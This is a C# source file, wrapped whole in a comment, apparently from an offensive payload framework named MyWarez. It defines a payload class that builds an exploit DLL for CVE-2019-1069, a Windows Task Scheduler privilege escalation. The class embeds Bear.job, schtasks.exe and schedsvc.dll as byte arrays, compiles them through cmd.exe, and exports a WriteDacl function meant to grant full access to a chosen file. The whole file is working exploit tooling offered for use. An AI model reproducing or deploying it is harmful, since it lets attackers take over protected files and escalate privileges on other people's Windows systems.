/*using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Diagnostics;

using MyWarez.Core;


namespace MyWarez.Payloads
{
    // Gives Full access to outfilepath
    // Some restrictions apply

    // Exports: int WriteDacl(wchar_t* outfilepath)
    public class CVE_2019_1069 : DynamicLinkLibrary
    {
        public CVE_2019_1069(Payload targetPathCppPayload) : base(Constants.DynamicFilePayloadDirectory + "DynamicLinkLibrary" + Path.DirectorySeparatorChar + typeof(CVE_2019_1069).Name)
        {
            if (!(targetPathCppPayload is IFilePayload))
                throw new ArgumentException();
            TargetPathCppPayload = targetPathCppPayload;
        }
        public CVE_2019_1069() : this(new LicenseTargetPath()) { }
        public override string Name { get; } = "CVE_2019_1069";
        private string ResourceFileName = "Resources.h";
        private IEnumerable<string> Resources = new List<string>() { "Bear.job", "schtasks.exe", "schedsvc.dll" };
        private void PrepResources()
        {
            var sb = new StringBuilder();

            foreach (var r in Resources)
            {
                var r_bytes = File.ReadAllBytes(r);
                var r_size = r_bytes.Length;
                sb.Append(string.Format("extern unsigned long {0}_Size = {1};", r.Replace(".", "_"), r_size));
                sb.AppendLine();
                sb.Append("extern " + Utils.BytesToCArray(r_bytes, varName: r.Replace(".", "_") + "_Bytes"));
                sb.AppendLine();
            }

            System.IO.File.WriteAllText(ResourceFileName, sb.ToString());
        }
        public Payload TargetPathCppPayload { get; }
        private void CopyTargetPath()
        {
            string targetPathSource = ((IFilePayload)TargetPathCppPayload).Text;
            if (!targetPathSource.Contains("wchar_t* GetTargetDirectory()"))
                throw new ArgumentException("GetTargetDirectory not implemented!");
            if (!targetPathSource.Contains("wchar_t* GetTargetFilename()"))
                throw new ArgumentException("GetTargetFilename not implemented!");
            if (!targetPathSource.Contains("wchar_t* GetTargetPath()"))
                throw new ArgumentException("GetTargetPath not implemented!");
            if (!targetPathSource.Contains("wchar_t* GetTargetDirectoryWithoutSlash()"))
                throw new ArgumentException("GetTargetDirectoryWithoutSlash not implemented!");
            File.WriteAllText("TargetPath.cpp", targetPathSource);
        }
        public override byte[] Bytes
        {
            get
            {
                var myTempDir = Constants.TempDirectory + Utils.RandomString(5);
                Directory.CreateDirectory(myTempDir);
                Utils.CopyFilesRecursively(SourceDirectory, myTempDir);
                var cwd = Directory.GetCurrentDirectory();
                Directory.SetCurrentDirectory(myTempDir);
                PrepResources();
                CopyTargetPath();
                var proc2 = Process.Start("cmd.exe", "/c " + CompileScriptName);
                proc2.WaitForExit();
                var outputFileName = ExecutableName + ".dll";
                var outputBytes = System.IO.File.ReadAllBytes(outputFileName);
                Directory.SetCurrentDirectory(cwd);

                return outputBytes;
            }
        }
    }
}
*/